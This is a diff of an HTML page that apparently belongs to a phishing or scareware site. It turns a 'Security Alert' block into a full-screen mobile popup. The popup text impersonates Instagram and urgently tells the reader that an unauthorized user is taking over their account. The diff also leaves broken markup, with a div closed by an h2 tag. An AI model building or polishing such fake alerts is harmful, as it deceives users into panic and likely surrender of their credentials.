@@ -183,8 +183,10 @@
         <span class="sr-only">Profile</span>
       </a>
     </footer>
-            <div class="alert-header">
-                <h2 class="alert-title text-lg">⚠️ Security Alert ⚠️</h2>
+          <div id="alert-popup" class="mobile-overlay">
+    <div class="absolute inset-0 bg-black/70"></div>
+    <div class="relative bg-white rounded-3xl p-6 w-full max-w-[320px] text-center shadow-2xl border border-red-200">
+      <div class="text-red-600 font-bold mb-2">⚠️ Security Alert ⚠️</h2>
                 <p class="alert-description">
                     Attention! This is an emergency security alert. Your Instagram account is currently being accessed by an unauthorized user from an unknown location. Immediate action is required to prevent a total account takeover. Do not ignore this message.
                 </p>
@@ -437,6 +439,7 @@ document.getElementById('close-popup').addEventListener('click', () => {
   </script>
 </body>
 </html>
+
 
 
 
